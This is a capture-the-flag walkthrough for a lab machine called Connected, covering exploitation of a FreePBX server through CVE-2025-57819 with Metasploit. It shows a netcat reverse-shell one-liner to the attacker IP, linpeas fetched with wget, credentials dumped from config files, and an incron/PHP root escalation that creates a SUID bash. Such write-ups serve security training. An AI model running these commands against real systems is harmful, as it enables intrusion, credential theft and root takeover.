# Connected: Easy

```sh
sudo vim /etc/hosts
# add connected.htb

nmap -T4 -p- -A -Pn -v connected.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 7.4
    * 80/tcp: http: Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
    * 443/tcp: ssl/http: Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)

* the ```nmap``` scan shows the webpage on port 80 has a 'robots.txt' entry

* additionally, the scan shows that for port 443, the SSL cert has a 'commonName' entry for 'pbxconnect'

* checking the webpage on port 80, it leads to the 'FreePBX Administration' page at 'http://connected.htb/admin/config.php'

* the footer mentions the version info FreePBX 16.0.40.7

* the page on port 443 leads to a similar page for the FreePBX Admin Panel

* both pages contain various links to different sections:

    * ISymphonyV3 Panel: 'http://connected.htb/admin/config.php?display=cxpanel_menu': this leads to the same view

    * UCP (User Control Panel): 'http://connected.htb/ucp': this page leads to a login form

    * FreePBX Administration: 'http://connected.htb/admin/config.php#': this pops up a login prompt

    * Operator Panel: 'http://connected.htb/admin/cxpanel': this gives the error message 'Offline system'

* Google shows that FreePBX is an open-source, web-based IP PBX management tool, designed to manage & configure Asterisk (PBX: Private Branch Exchange)

* IP-PBX is used for phone systems, and the software supports SIP/VoIP systems, software and hardware phones

* Googling for default creds shows that FreePBX does not have default creds, but common usernames like 'admin', 'root', 'sangoma' can be used with weak passwords like 'admin', 'password', 'sangoma', 'SangomaDefaultPassword', etc.

* we can try all these creds for both the admin panel as well as the UCP: but the creds don't work

* Googling for exploits associated with FreePBX 16.0.40.7 leads to [CVE-2025-57819: an unauthenticated SQLi leading to auth bypass and RCE](https://nvd.nist.gov/vuln/detail/cve-2025-57819)

* searching for exploit info leads to [another article](https://horizon3.ai/attack-research/the-freepbx-rabbit-hole-cve-2025-66039-and-others/), which mentions similar exploits like [CVE-2025-66039: authentication bypass for 'webserver' auth type](https://nvd.nist.gov/vuln/detail/CVE-2025-66039), and [CVE-2025-61678: an arbitrary file upload exploit in Endpoint Manager leading to RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-61678)

* the exploit is also available as a Metasploit module, so we can test it out:

    ```sh
    msfconsole -q

    search cve-2025-57819
    # we have an unauthenticated SQLi to RCE exploit

    use exploit/unix/http/freepbx_unauth_sqli_to_rce

    options

    set RHOSTS connected.htb
    set LHOST tun0

    run
    # the exploit works and we get a meterpreter session
    # if this does not work, set SSL to true, and RPORT to 443, and try again

    shell
    # drop into a shell
    ```

* we can upgrade to a better shell by using a reverse shell one-liner so that we can upgrade it:

    ```sh
    nc -nvlp 5555
    # setup listener
    ```

    ```sh
    # in meterpreter shell
    # use a revshell one-liner that works
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.65 5555 >/tmp/f
    ```

* we get reverse shell on our listener now:

    ```
    id
    # user 'asterisk'

    # stabilise shell
    which python3
    # unavailable

    which python
    # available

    python -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/home/asterisk'

    ls -la
    # check all files

    cat user.txt
    # user flag

    ls -la /home
    # we have only one user 'asterisk'

    ls -la /

    ls -la /var/

    ls -la /var/www/
    # check web-related files

    ls -la /var/www/html
    # we have a few interesting folders here
    # check all files for any secrets

    ls -la /var/www/html/admin

    cat /var/www/html/admin/config.php
    ```

* we do not get any config info in any of the web files

* Googling to check where freePBX stores cred info shows that it is stored in a MySQL DB 'asterisk', and the DB info can be found at ```/etc/freepbx.conf``` - we can try checking this file:

    ```sh
    ls -la /etc/freepbx.conf
    # readable by 'asterisk' user

    cat /etc/freepbx.conf
    ```

* the config file for FreePBX gives us the creds 'freepbxuser:mZzDpAGKTmPJ': we can try using these creds to check for any DB info:

    ```sh
    mysql -u freepbxuser -pmZzDpAGKTmPJ -e 'show databases'

    mysql -u freepbxuser -pmZzDpAGKTmPJ -D asterisk -e 'show tables'
    # according to Google, we should check the 'ampusers' table to get user hashes

    mysql -u freepbxuser -pmZzDpAGKTmPJ -D asterisk -e 'select * from ampusers'
    ```

* the MySQL table 'ampusers' gives us a single SHA1 hash for the 'admin' user, but we are unable to crack the hash using online tools and ```hashcat```

* we can use ```linpeas``` for enumeration: fetch the script from attacker:

    ```sh
    wget http://10.10.14.65:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.239-1.el7.elrepo.x86_64
    * sudo version 1.8.23
    * ```/var/spool/asterisk``` paths highlighted for multiple cronjobs:

        ```sh
        /var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
        /var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
        /var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
        /var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
        /var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
        /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
        /usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
        /usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

        /var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
        ```

    * local-only listeners found on multiple ports: 323, 25, 4000, 47017, 3306, 6379, 5038
    * Redis is not password protected, and config file is at ```/etc/redis.conf```
    * file ```/etc/amportal.conf``` discloses multiple credentials:

        * AMPMGRPASS=fe1mYBs7D5P3
        * AMPMGRUSER=wnPa2WbXJ/ED
        * FPBX_ARI_USER=zkazRzvH3LLW
        * FPBX_ARI_PASSWORD=04cd5eb91771e9eb716aeee1ed6812e0
        * PHP_CONSOLE_PASSWORD=batteryhorsestaple
    
    * unknown SUID binary mentioned: ```/usr/bin/incrontab```

* firstly, we can try re-using the creds found for logging in as 'asterisk' via SSH: but the creds fail

* similarly, checking for ```sudo -l``` also does not work as we don't have the creds

* Googling about the unknown SUID binary: ```incrontab``` - shows that it is a Linux daemon that executes commands when filesystem events occur

* we do not have any direct SUID exploits associated with ```incrontab```

* checking the incrontab entries flagged by ```linpeas``` earlier, we can see that if the paths mentioned under ```/var/spool/asterisk/*``` are triggered by the event ```IN_CLOSE_WRITE```, then the respective command is triggered

* the ```IN_CLOSE_WRITE``` file event is one of the file system changes: it triggers when a file that was opened for writing is closed by a process

* for example, the first ```incrontab``` entry watches the file ```/var/spool/asterisk/sysadmin/vpnget``` for any ```IN_CLOSE_WRITE``` events: if triggered, it runs the command ```/usr/sbin/sysadmin_openvpn -d```

* if the ```incrontab``` entries are configured to run as 'root', and if we have write permissions to the involved files, then we can forcefully trigger the event to get the script executed as 'root'

* we can check the files being monitored and the target binaries:

    ```sh
    ls -la /var/spool/asterisk
    # writable directory

    ls -la /var/spool/asterisk/sysadmin
    # the files are present, but they are empty

    ls -la /usr/local/asterisk/ha_trigger
    # empty, writable file
    
    ls -la /usr/local/asterisk/incron
    # empty, writable dir

    ls -la /var/spool/asterisk/incron
    # empty, writable dir

    # check the target files as well

    ls -la /usr/sbin/sysadmin_openvpn && file /usr/sbin/sysadmin_openvpn
    # PHP script

    ls -la /etc/init.d/fail2ban && file /etc/init.d/fail2ban
    # bash script

    ls -la /usr/sbin/sysadmin_update_set_cron && file /usr/sbin/sysadmin_update_set_cron
    # PHP script

    ls -la /usr/sbin/sysadmin_portmgmt && file /usr/sbin/sysadmin_portmgmt
    # does not exist

    ls -la /usr/sbin/sysadmin_wanrouter_restart && file /usr/sbin/sysadmin_wanrouter_restart
    # POSIX shell script

    ls -la /usr/sbin/sysadmin_dahdi_restart && file /usr/sbin/sysadmin_dahdi_restart
    # POSIX shell script

    ls -la /usr/sbin/sysadmin_ha && file /usr/sbin/sysadmin_ha
    # PHP script

    ls -la /usr/bin/sysadmin_manager && file /usr/bin/sysadmin_manager
    # PHP script
    ```

* almost all the target files seem to be readable scripts and not binaries, so we can check it easily; as the privesc vector is common regardless of the script, we can choose any script

* we can check the ```sysadmin_ha``` script as it is smaller in size:

    ```sh
    cat /usr/sbin/sysadmin_ha
    ```

    ```php
    #!/usr/bin/php -q
    <?php

    if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
    }

    $i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
    if (file_exists($i)) {
        require_once($i);
        $incron = new incron;
        $incron->rootTrigger();
    }
    ```

    * the script checks if the file ```/var/www/html/admin/modules/freepbx_ha/license.php``` exists: if yes, then it loads it

    * then, it checks if the file ```/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php``` exists: if yes, then this is also loaded: in this script, it checks for the 'incron' class and its 'rootTrigger' method, which is executed

* checking further shows that the directory ```/var/www/html/admin/modules/freepbx_ha``` does not exist, but can be created as the 'asterisk' user has write permissions in the parent directory

* we can create the malicious directory and the PHP script with the required trigger method: for example, to create a copy of ```bash``` with SUID-bit assigned:

    * create the PHP files referred in ```/usr/sbin/sysadmin_ha```:

        ```sh
        mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc
        # -p to create parent dir automatically if it does not exist

        touch /var/www/html/admin/modules/freepbx_ha/license.php

        touch /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
        ```
    
    * write the malicious PHP script into the PHP file with the 'rootTrigger' method of 'incron' class:

        ```sh
        cat << EOF > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
        <?php
        class incron
        {
            public function rootTrigger()
            {
                copy('/bin/bash', '/tmp/bash');
                chmod('/tmp/bash', 04755);
            }
        }
        EOF
        ```
    
    * verify the file is written correctly:

        ```sh
        cat /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
        ```
    
    * now, as per the ```incrontab``` entry, trigger the ```IN_CLOSE_WRITE``` functionality for the file ```/usr/local/asterisk/ha_trigger```:

        ```sh
        echo test > /usr/local/asterisk/ha_trigger
        # this opens the file for writing, which causes the event trigger
        ```
    
    * now, the ```bash``` binary should be copied and assigned SUID bit:

        ```sh
        ls -la /tmp

        /tmp/bash -p
        # this gives root shell

        id
        # root
        
        cat /root/root.txt
        # root flag
        ```
